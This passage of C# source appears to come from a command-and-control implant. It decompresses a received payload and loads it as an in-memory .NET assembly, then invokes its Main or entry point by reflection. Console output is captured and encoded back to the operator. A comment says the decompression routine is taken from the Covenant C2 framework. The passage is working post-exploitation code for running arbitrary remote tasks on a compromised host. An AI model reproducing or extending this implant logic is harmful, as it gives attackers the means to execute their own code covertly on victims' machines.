		    byte[] decompressedBytes = Decompress(compressedBytes);
		    Assembly agentTask = Assembly.Load(decompressedBytes);
		    
		    // Execute assembly and capture output synchronously
		    using (StringWriter consoleOutput = new StringWriter())
		    {
		        TextWriter originalConsoleOut = Console.Out;
		        try
		        {
		            Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
		            
		            // Try to find Program class first
		            Type programType = agentTask.GetType("Program");
		            
		            if (programType != null)
		            {
		                MethodInfo mainMethod = programType.GetMethod("Main");
		                if (mainMethod != null)
		                {
		                    mainMethod.Invoke(null, new object[] { parameters });
		                }
		                else
		                {
		                    lock (synclock)
		                    {
		                        output += "[ERROR] Main method not found in Program class.\n";
		                    }
		                }
		            }
		            else
		            {
		                // Fallback: Use entry point if Program class not found
		                MethodInfo entryPoint = agentTask.EntryPoint;
		                
		                if (entryPoint != null)
		                {
		                    try
		                    {
		                        entryPoint.Invoke(null, new object[] { parameters });
		                    }
		                    catch (ArgumentException)
		                    {
		                        // Try without parameters if string[] doesn't work
		                        try
		                        {
		                            entryPoint.Invoke(null, null);
		                        }
		                        catch (ArgumentException)
		                        {
		                            // Try with empty string array
		                            entryPoint.Invoke(null, new object[] { new string[0] });
		                        }
		                    }
		                }
		                else
		                {
		                    lock (synclock)
		                    {
		                        output += "[ERROR] No Program class or entry point found in assembly.\n";
		                    }
		                }
		            }
		        }
		        catch (TargetInvocationException ex)
		        {
		            var innerEx = ex.InnerException;
		            lock (synclock)
		            {
		                output += $"[ERROR] {innerEx?.Message ?? ex.Message}\n";
		                if (innerEx?.StackTrace != null)
		                {
		                    output += $"Stack Trace: {innerEx.StackTrace}\n";
		                }
		            }
		        }
		        catch (ReflectionTypeLoadException ex)
		        {
		            lock (synclock)
		            {
		                output += $"[ERROR] ReflectionTypeLoadException: {ex.Message}\n";
		                foreach (Exception loaderEx in ex.LoaderExceptions)
		                {
		                    output += $"Loader Error: {loaderEx?.Message}\n";
		                }
		            }
		        }
		        catch (ArgumentException ex)
		        {
		            lock (synclock)
		            {
		                output += $"[ERROR] ArgumentException: {ex.Message}\n";
		                output += $"Parameter: {ex.ParamName}\n";
		            }
		        }
		        catch (BadImageFormatException ex)
		        {
		            lock (synclock)
		            {
		                output += $"[ERROR] BadImageFormatException: {ex.Message}\n";
		                output += "Assembly might be corrupted or wrong architecture\n";
		            }
		        }
		        catch (FileLoadException ex)
		        {
		            lock (synclock)
		            {
		                output += $"[ERROR] FileLoadException: {ex.Message}\n";
		                output += $"File: {ex.FileName}\n";
		            }
		        }
		        catch (Exception ex)
		        {
		            lock (synclock)
		            {
		                output += $"[ERROR] {ex.GetType().Name}: {ex.Message}\n";
		                output += $"Stack Trace: {ex.StackTrace}\n";
		            }
		        }
		        finally
		        {
		            Console.SetOut(originalConsoleOut); // Restore original Console.Out
		        }
		        
		        lock (synclock) // Safely add console output
		        {
		            output += consoleOutput.ToString();
		        }
		    }
		    
		    // Return the captured output to the agent
		    return EncodePacket(packet.type, output, packet.taskId);
		}
		catch (Exception ex)
		{
		    string errorOutput = $"[OUTER ERROR] {ex.GetType().Name}: {ex.Message}\n{ex.StackTrace}\n";
		    return EncodePacket(packet.type, errorOutput, packet.taskId);
		}
	    }
	    
	    return EncodePacket(packet.type, "[ERROR] Invalid packet data", packet.taskId);
	}

        //Decompress function may want to move this somewhere else at some point
        //taken from Covenant https://github.com/cobbr/Covenant/tree/master/Covenant
        public static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

    }
}
